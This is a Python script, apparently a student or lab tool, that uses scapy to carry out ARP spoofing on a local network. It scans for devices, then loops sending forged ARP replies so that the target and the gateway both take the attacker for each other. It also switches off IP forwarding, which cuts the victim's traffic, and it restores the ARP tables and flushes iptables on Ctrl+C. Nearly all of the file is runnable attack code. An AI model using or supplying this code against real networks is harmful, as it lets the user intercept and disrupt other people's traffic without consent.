import sys
import os
import netifaces
import scapy.all as scapy

# print(sys.path)

def get_mac(ip):
    for a in range(20):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list, unanswer = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)
        if len(answered_list) == 0:
            print("no find")
            continue
        else:
            return answered_list[0][1].hwsrc
    print("Can't find mac address")

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
  
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

def get_local_info():
    
    interfaces = netifaces.interfaces()

    for interface_name in interfaces:
        interface = netifaces.ifaddresses(interface_name)
        try:
            # dictionary
            normal_internet = interface[netifaces.AF_INET][0]
            address = normal_internet['addr']
            netmask = normal_internet['netmask']
            broadcast = normal_internet['broadcast']
            # slash = IPAddress(netmask).netmask_bits()
            slash = translate_to_slash(netmask)
            # obtain gateway
            gws = netifaces.gateways()
            gw = gws['default'][netifaces.AF_INET][0]
            return address, netmask, broadcast, str(slash), gw
        except KeyError:
            print("this interface: ", interface_name, " isn't feasible")
            continue

def translate_to_slash(netmask):
    temp = netmask.rsplit('.')
    number = 0
    for i in range(4):
        number = number << 8
        number += int(temp[i])
    slash = 0
    for i in range(32):
        if number % 2 == 1:
            slash = i
            break
        number = number >> 1
    return 32 - slash

def getDevice(ip, gw):
    request = scapy.ARP()
    request.pdst = ip
    broadcast = scapy.Ether()

    broadcast.dst = 'ff:ff:ff:ff:ff:ff'

    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]

    result = []

    print('Available devices')
    print('----------------------------')
    print('IP         MAC')
    print('----------------------------')
    for element in clients:
        if element[1].psrc != gw:
            print(element[1].psrc + "   " + element[1].hwsrc)
            result_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            result.append(result_dict)
    print(' ')

    return result

if __name__ == '__main__':

    address, netmask, broadcast, slash, gw = get_local_info()

    gateway_ip = gw
    gateway_ip = '192.168.99.100'
    target_ip = '192.168.99.1' # server = '224.0.0.251', iot = '192.168.99.104'
    # target_mac = '6c:21:a2:5b:6e:02'
    print("Trying to reach target: 192.168.99.208 ...")
    target_mac = get_mac(target_ip)
    print("Finally I got MAC: {}".format(get_mac(target_ip)))

    try:
        sent_packets_count = 0
        os.system("sysctl -w net.ipv4.ip_forward=0")
        while True:
            spoof(target_ip, gateway_ip, target_mac) # cheat on victim to know I am gateway
            spoof(gateway_ip, target_ip, target_mac) # cheat on switch to know I am target
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+ str(sent_packets_count), end ="")
            # time.sleep(0.5) # Waits for two seconds
    
    # # try:
    # #     sent_packets_count = 0
    # #     while True:
    # #         for index in result:
    # #             if index['ip'] != gw:
    # #                 target_ip = index['ip']
    # #                 target_mac = index['mac']
    # #                 spoof(target_ip, gateway_ip, target_mac) # cheat on victim to know I am gateway
    # #                 spoof(gateway_ip, target_ip, target_mac) # cheat on switch to know I am target
    # #                 sent_packets_count = sent_packets_count + 2
    # #                 print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
    # #                 # time.sleep(0.5) # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        print("[-] Arp Spoof Stopped")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        os.system("iptables -t nat -F")
        print("stop thread")